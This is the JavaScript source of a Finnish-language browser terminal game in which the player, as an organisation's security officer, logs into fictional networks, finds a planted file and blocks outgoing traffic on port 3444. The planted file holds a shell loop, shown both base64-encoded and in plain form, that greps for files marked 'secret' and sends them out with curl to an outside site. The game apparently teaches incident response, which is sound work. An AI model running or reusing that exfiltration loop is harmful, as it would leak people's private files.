var systemOnlineHome = false;
var systemOnlineMgmt = false;
var systemOnlineWow = false;
var hackcheck = false;
var fix = false;
var send_msg = false;
var new_msg = false;
var security = false;

$('body').terminal({
    vihje: function(){
        if(systemOnlineHome == false && systemOnlineMgmt == false && systemOnlineWow == false){
            this.echo("help-komento esittelee ls- ja cat-komennot. Tehtävänä on yhdistää tietoturvahallinnon verkkoyhteyteen. Tarvittavat tiedot voidaan lukea cat-komennolla tiedostoista.\n")
        }
        else if(systemOnlineMgmt == true && hackcheck == false && fix == false && security == false && send_msg == false && new_msg == false){
            this.echo("HackCheckPro ohjelma saattaa löytää jotain. Kirjoita HackCheckPro ja paina Enter.")
        }
        else if(systemOnlineMgmt == true && hackcheck == true && fix == false && security == false && send_msg == false && new_msg == false){
            this.echo("HackCheckPro löysi jotain! Mikäköhän tiedosto on kyseessä? Ehkä FileChecker saa selville jotain.")
        }
        else if(systemOnlineMgmt == true && hackcheck == true && fix == true && security == false && send_msg == false && new_msg == false){
            this.echo("Tästä kannattaa lähettää viestiä pomolle.")
        }
        else if(systemOnlineMgmt == true && hackcheck == true && fix == true && security == false && send_msg == true && new_msg == false){
            this.echo("Mitäköhän pomo vastasi?")
        }
        else if(systemOnlineMgmt == true && hackcheck == true && fix == true && security == false && send_msg == true && new_msg == true){
            this.echo("Suoritetaan SecuritySetup pomon ohjeiden mukaan.")
        }
    },
    help: function() {
        if (systemOnlineMgmt == true || systemOnlineHome == true || systemOnlineWow == true){
            this.echo("exitNetwork - Poistu nykyisestä tietoverkosta offline-tilaan\n")
        }
        this.echo("ls - Listaa tiedostot\ncat - Näyttää tiedostoon kirjoitetun sisällön. Käyttö: cat tiedosto.txt\nclear - Tyhjentää komentohistorian\n")
    },
    ls: function() {
        if(systemOnlineHome==false&&systemOnlineMgmt==false&&systemOnlineWow==false)
        {
            this.echo("\nFILE SYSTEM:\ntietokone_tietoverkot.txt\nsalasanat_SALAINEN.txt\nsynttärikutsu.doc\nREADME_yhdistys_ohje\n")
        }
        if (systemOnlineHome == true){
            this.echo("KOTIVERKKO:\npasianssi\nkissakuva.jpeg\n")
        }
        if (systemOnlineWow == true){
            this.echo("PELIJUTUT:\npeli_strategia_ohjeet.exe\nWorldOfWarcraft\nDiscord\n")
        }
        if (systemOnlineMgmt == true && hackcheck == false){
            this.echo("HOME:\nKorjausohje\nEmail\n\nSYSTEM CONTROL TOOLS:\nHackCheckPro\nFileChecker\n")
        }
        if (hackcheck == true && fix == false){
            this.echo("HOME:\nKorjausohje\nEmail\n(Uusi) lolh4x\n\nSYSTEM CONTROL TOOLS:\nHackCheckPro\nFileChecker\n")
        }
        if (hackcheck == true && fix == true){
            this.echo("HOME:\nKorjausohje\nEmail\nlolh4x\n\nSYSTEM CONTROL TOOLS:\nHackCheckPro\nFileChecker\n")
        }
        if(hackcheck == true && fix == true && new_msg == true){
            this.echo("HOME:\nKorjausohje\nEmail\nlolh4x\n\nSYSTEM CONTROL TOOLS:\n(Uusi) SecuritySetup\nHackCheckPro\nFileChecker\n")
        }
    }, 
    cat: function(what) {
            if(what=="salasanat_SALAINEN.txt") {
                this.echo('koti_verkko: (vihje - kotikatu)\nhallinto_oma_vlan: (vihje - synttäripäivä ddmmyyyy)\npelivlanis: (vihje - WoW factioneista parempi)');
                //koti_verkko: hattukatu   hallinto_oma_vlan: 12051999   wlanitykitys: alliance
            } else if (what=="tietokone_tietoverkot.txt") {
                this.echo('\nkoti_verkko: ip-osoite:10.12.1.0 subnet:1224\nhallinto_oma_vlan: ip-osoite:11.20.11.2 subnet:0250\npelivlani: ip-osoite:1.14.13.0 subnet:3222\n');
            } else if (what == "synttärikutsu.doc"){
                this.echo('MUISTA LÄHETTÄÄ KUTSU ENNEN 1.5!!!\n***** TERVETULOA 24-VUOTISSYNTYMÄPÄIVILLE! *******\n\nMissä?\nAloitellaan kotona, myöhemmin raflaan syömään.\nOsoite on: hattukatu 13B\nMilloin?\n12.5 klo 15:00\nTERVETULOA! (ps. ei lahjapakkoa mut sukat ois jees.)\n');
            } else if (what == "README_yhdistys_ohje") {
                this.echo("Yhdistys tietoverkkoon:\n1.Anna komento  network  ja paina Enter.\n2.Anna verkon nimi\n3.Anna verkon ip-osoite\n4.Anna verkon subnet\n5.Anna verkon salasana\n")
            } else if (what == "Korjausohje"){
                this.echo("Järjestelmään on piiloutunut haitallinen tiedosto. HackCheckPro ohjelma saattaisi löytää sen.\nFileChecker voi korjata tiedostoja (käyttö: FileChecker tiedostonimi)\n")
            } else if (what == "lolh4x" && fix == false){ 
                this.echo("I2l0ZXJvaWRhYW4gZXJpbGxpc2V0IG9iamVrdGl0IGtva\nHRlZXNzYSwgam9rYSBtYWFyaXRlbGxhYW4gZmluZCBrb2\n1lbm5vbGxhLiBmaW5kIGtvbWVudG8gZXRzaWkgc3Blc2l\nmaXN0aSB0aWVkb3N0b2phLgpmb3IgZmlsZSBpbiAkKGZp\nbmQgLiAtdHlwZSBmKTsgZG8KICAgICNncmVwaWxsYSBoY\nWV0YWFuIGthaWtpc3RhIGFsaWthbnNpb2lzdGEgInNhbG\nFpbmVuIiAgdGVybWlhIGZpbmRpbiBsb3l0YW1pc3RhIG9\niamVrdGVpc3RhLgogICAgaWYgZ3JlcCAtcSAic2FsYWlu\nZW4iICRmaWxlOyB0aGVuCiAgICAgICAgZXhlYyAoY3Vyb\nCAkZmlsZSBodHRwczovL3Ryb2xsaXNpdnUubmV0KQogIC\nAgZmkKZG9uZQ==")
            } else if (what == "lolh4x" && fix == true) {
                this.echo("#iteroidaan erilliset objektit kohteessa, joka määritellään find komennolla.\n find komento etsii spesifisti tiedostoja.\nfor file in $(find . -type f); do\n#grepillä haetaan kaikista alikansioista \"salainen\"\n  termiä ja lähetetään ne portista 3444.\nif grep -q \"salainen\" $file; then\nexec (curl -d $file https://trollisivu.net)\nfi\ndone")
            } else if (what == "Email" || what == "HackCheckPro" || what == "SecuritySetup" || what == "FileChecker"){
                this.echo("Kohde ei ole tiedosto.")
            }
             else if (what == null) {
                this.echo("Väärin meni. Tulosta ohjeet 'help'-komennolla.")
            } else {
                this.echo("Väärin meni. Tulosta ohjeet 'help'-komennolla.");
            }
    },
    network: function(){
        var self = this;
        var selection = {};

        this.push(function(command) {
            switch (command) {
                case "hattukatu":
                    selection.password="hattukatu";
                    break;
                case "12051999":
                    selection.password="12051999";
                    break;
                case "alliance":
                    selection.password="alliance";
                    break;
                case "exit":
                    break;
                default:
                    break;
            }
            self.pop();
            checkSelection();
        }, {
            prompt: 'Salasana: '
        });
        this.push(function(command) {
            switch (command) {
                case "1224":
                    selection.subnet="1224";
                    break;
                case "0250":
                    selection.subnet="0250";
                    break;
                case "3222":
                    selection.subnet="3222";
                    break;
                case "exit":
                    break;
                default:
                    break;
            }
            self.pop();
        }, {
            prompt: 'Subnet: '
        });
        this.push(function(command) {
            switch (command) {
                case "10.12.1.0":
                    selection.ip="10.12.1.0";
                    break;
                case "11.20.11.2":
                    selection.ip="11.20.11.2";
                    break;
                case "1.14.13.0":
                    selection.ip="1.14.13.0";
                    break;
                case "exit":
                    break;
                default:
                    break;
            }
            self.pop();
        }, {
            prompt: 'IP-osoite: '
        });
        this.push(function(command) {
            switch (command) {
                case "koti_verkko":
                    selection.net="koti_verkko";
                    break;
                case "hallinto_oma_vlan":
                    selection.net="hallinto_oma_vlan";
                    break;
                case "pelivlani":
                    selection.net="pelivlani";
                    break;
                case "exit":
                    break;
                default:
                    break;
            }
            self.pop(); 
        }, {
            prompt: 'Verkon nimi: '
        });

        var checkSelection = function() {
            if (selection.hasOwnProperty('ip') && selection.hasOwnProperty('password') && selection.hasOwnProperty('subnet') && selection.hasOwnProperty('net')) {
                if (selection.ip === "10.12.1.0" && selection.password === "hattukatu" && selection.subnet === "1224" && selection.net === "koti_verkko") {
                    self.set_prompt('koti_verkko > ');
                    self.echo('SYSTEM ONLINE - Yhdistetty verkkoon koti_verkko');
                    systemOnlineHome = true;
                } else if (selection.ip === "11.20.11.2" && selection.password === "12051999" && selection.subnet === "0250" && selection.net === "hallinto_oma_vlan") {
                    self.set_prompt('hallinto_oma_vlan > ');
                    self.echo('SYSTEM ONLINE - Yhdistetty verkkoon hallinto_oma_vlan');
                    systemOnlineMgmt = true;
                } else if (selection.ip === "1.14.13.0" && selection.password === "alliance" && selection.subnet === "3222" && selection.net === "pelivlani") {
                    self.set_prompt('pelivlani > ');
                    self.echo('SYSTEM ONLINE - Yhdistetty verkkoon pelivlani.');
                    systemOnlineWow = true;
                } else {
                    self.echo("SYSTEM OFFLINE - Yhteys verkkoon epäonnistui. Yritä uudelleen. \n");
            }
        } else {
            self.echo("SYSTEM OFFLINE - Yhteys verkkoon epäonnistui. Yritä uudelleen. \n");
        }
    }},
    clear: function(){
        $('body').terminal().purge();
    },
    exitNetwork: function(){
        var self = this;
        systemOnlineHome = false;
        systemOnlineMgmt = false;
        systemOnlineWow = false;
        self.echo("Tietoverkkoyhteys katkaistu.");
        self.set_prompt('offline > ');
    },
    HackCheckPro: function(){
        this.echo("HACK-CHECK-PRO\nAloitetaan skannaus...\n");
        var frames = [
            'HACK',
            '   /\\ ',
            '  /  \\ ',
            ' /    \\ ',
            'CHECK',
            ' \\    / ',
            '  \\  / ',
            '   \\/ ',
            'PRO'
        ];
    
        var index = 0;
        var timeout = 0;
        var intervalId;
        var displayNextFrame = function() {
        this.echo(frames[index], {update:true});
        index++;
        timeout += 1;
        if (index === frames.length) { 
            index = 0;
            };
        if (timeout == 18) {
            stopAnimation();
            this.echo("\n\nSkannaus valmis.");
            this.echo("\n1 Haitallinen Tiedosto Löydetty.\nTiedosto muutettu näkyväksi.\n")
            hackcheck = true;
        };
        }.bind(this);

        var startAnimation = function() {
            intervalId = setInterval(displayNextFrame, 500);
        };
        var stopAnimation = function() {
            clearInterval(intervalId); 
        };
        startAnimation();
    },
    FileChecker: function(what){
        if (what == "lolh4x"){
            fix = true;

            this.echo("\n Korjataan tiedostoa....\n")
            var frames= ["I2l0ZXJvaWRhYW4gZXJpbGxpc2V0IG9iamVrdGl0IGtva",
            "#iteroidaan erilliset objektit kohteessa,",
            "HRlZXNzYSwgam9rYSBtYWFyaXRlbGxhYW4gZmluZCBrb2",
            "joka määritellään find komennolla.",
            "1lbm5vbGxhLiBmaW5kIGtvbWVudG8gZXRzaWkgc3Blc2l",
            "find komento etsii",
            "aXN0aSB0aWVkb3N0b2phLgpmb3IgZmlsZSBpbiAkKGZp",
            "spesifisti tiedostoja.",
            "bmQgLiAtdHlwZSBmKTsgZG8KICAgICNncmVwaWxsYSBoY",
            "for file ",
            "V0YWFuIGthaWtpc3RhIGFsaWthbnNpb2lzdGEgInNhbG",
            "in $(find . -type f); do",
            "FpbmVuIiAgdGVybWlhIGZpbmRpbiBsb3l0YW1pc3RhIG9",
            "#grepillä haetaan kaikista alikansioista ",
            "iamVrdGVpc3RhLgogICAgaWYgZ3JlcCAtcSAic2FsYWlu",
            "$file; then exec termiä findin löytämistä",
            "ZW4iICRmaWxlOyB0aGVuCiAgICAgICAgZXhlYyAoY3Vyb",
            "(curl -d $file https://trollisivu.net)",
            "CAkZmlsZSBodHRwczovL3Ryb2xsaXNpdnUubmV0KQogIC",
            "fi done",
            "AgZmkKZG9uZQ==",
            ]
            var index = 0;
            var timeout = 0;
            var intervalId;
            var displayNextFrame = function() {
            this.echo(frames[index], {update:true});
            index++; //
            timeout += 1;
            if (index === frames.length) { 
                index = 0;
                };
            if (timeout == 21) {
                stopAnimation();
                this.echo("\nKorjaus valmis")
                this.echo("Tiedosto lolh4x tarkistettu.")
                this.echo("Tiedoston sisältö päivitetty.\n")
            };
            }.bind(this);
            var startAnimation = function() {
                intervalId = setInterval(displayNextFrame, 500);
            };
            var stopAnimation = function() {
                clearInterval(intervalId); 
            };
            startAnimation();
        } else {
            this.echo("Jotain meni pieleen. Käyttö: FileChecker tiedostonnimi\n")
        }
        var receiveMessage = function(){
            this.echo("lol")
        }
    },
    Email: function(what){
        if (send_msg == false && new_msg == false){
            this.echo("1. Ohjeet\n2. Uusi viesti\n3. Saapuneet viestit\n4. Poistu\n")
        } else if (send_msg == true && new_msg == true) {
            this.echo("1. Ohjeet\n2. Uusi viesti\n3. Saapuneet viestit (1)\n4. Poistu\n")
        }
        var inbox = [];
        var selection = {};
          this.push(function(command) {
            if (command === "1" || command.toLowerCase() === "instructions") {
              this.echo("Ohjeet:\n1. Uusi Viesti:\n- Syötä vastaanottaja yhteystiedoista.\n- Syötä liitetiedoston nimi.\n- Kirjoita viesti.\n2. Saapuneet viestit:\n- Valitse viestin numero."); // Display instructions
              this.resume();
            } else if (command === "2" || command.toLowerCase() === "new message") {
              this.echo("Uusi viesti")
              this.push(function(command) {
                var recipient = command;
                selection.recipient = command;
                this.pop();
                this.push(function(command) {
                  var subject = command;
                  selection.subject = command;
                  this.pop();
                  this.push(function(command) {
                    var body = command;
                    this.pop();
                    this.echo("Viesti lähetetty");
                    send_msg == true;
                    if(selection == "pomo" || recipient == "Pomo" && subject == "lolh4x")
                        setTimeout(function() {
                            inbox.push({
                              recipient: "Tietoturvavastaava",
                              subject: "lolh4x",
                              body: "Loistavaa työtä! SecuritySetup korjaa altistuneen järjestelmän.\nKäynnistä ohjelma ja estä uloslähtevä liikenne portista 3444.\n"
                            });
          
                            this.echo("Email: Uusi viesti saapunut. Lähettäjä: Pomo. Avataan viesti....\n");
                            this.echo("From: Pomo\nTo: Tietoturvavastaava\nViesti: Loistavaa työtä!\nLaitoin järjestelmääsi uuden ohjelman.\nSecuritySetup korjaa altistuneen järjestelmän.\nKäynnistä ohjelma ja estä uloslähtevä liikenne portista 3444.\n")
                            new_msg = true;
                          }.bind(this), 7000);
                    this.pop();
                  }, {
                    prompt: 'Viesti: '
                  });
                }, {
                  prompt: 'Tiedoston nimi (tiedostot: Korjausohje / lolh4x): '
                });
              }, {
                prompt: 'Vastaanottaja (yhteystiedot: Pomo / Jatta / William): '
              });
            } else if (command === "3" || command.toLowerCase() === "inbox") {
              if (new_msg == true){
                if (inbox.length === 0) {
                    this.echo("0 viestiä.");
                  } else {
                  
                    inbox.forEach(function(message) {
                      this.echo("Lähettäjä: " + message.recipient);
                      this.echo("Aihe: " + message.subject);
                      this.echo("Viesti: " + message.body);
                      this.echo("-------------------------");
                    }.bind(this));
                  }
                  this.pop();
              }
              this.pop();
            } else if (command === "4" || command.toLowerCase() === "quit") {
              this.echo("Poistutaan~");
              this.resume();
            } else {
              this.echo("Virheellinen valinta. Valitse toiminto 1-4.");
              this.resume();
            }
          }, {
            prompt: 'Valitse toiminto (1-4): '
          });
        },
    SecuritySetup: function(what) {

        var openPorts = {
            80: true,
            1112: false,
            3444: true
          };

          this.echo("=== Security Setup ===");
          this.echo("1. Hallinnoi liikennettä");
          this.echo("2. Palomuuri");
          this.echo("3. Tarkista levy");

          this.push(function(command) {
            if (command === "1") {
              this.echo("=== Avoimet Portit ===");
              for (var port in openPorts) {
                this.echo(port + ": " + (openPorts[port] ? "ON" : "OFF"));
              }

              this.push(function(portCommand) {
                if (openPorts.hasOwnProperty(portCommand)) {
                  openPorts[portCommand] = !openPorts[portCommand];
                  this.echo(portCommand + " toggled " + (openPorts[portCommand] ? "ON" : "OFF"))
                  this.echo("DEMO SUORITETTU. ONNEKSI OLKOON! (salainen avain: kyberturvallisuuden_tulevaisuus)")
                } else {
                  this.error("Väärä porttivalinta. Kokeile uudelleen.");
                }
                this.pop();
                this.pop();
              }, {
                prompt: "Mitä porttia haluat hallinnoida : "
              });

            } else if (command === "2") {
              this.echo("Palomuuri toiminnallinen.");
            } else if (command === "3") {
              this.echo("Levyt kunnossa.");
            } else {
              this.error("Invalid option. Please try again.");
            }
          }, {
            prompt: "Valitse toiminto (1, 2 tai 3): "
          });
    }
},{
    greetings: 'SYSTEM CONTROL\nhelp -komennolla lisäohjeita.\nvihje -komennolla vinkki.\nKirjoita komento ja paina Enter.\nOlet organisaation tietoturvavastaava.\nOrganisaation tietoverkossa on havaittu epäilyttävää toimintaa. Tehtävänäsi on yhdistää tietoverkkoon ja ratkaista ongelmatilanne.',
    prompt: 'offline > ',
    checkArity: false
});
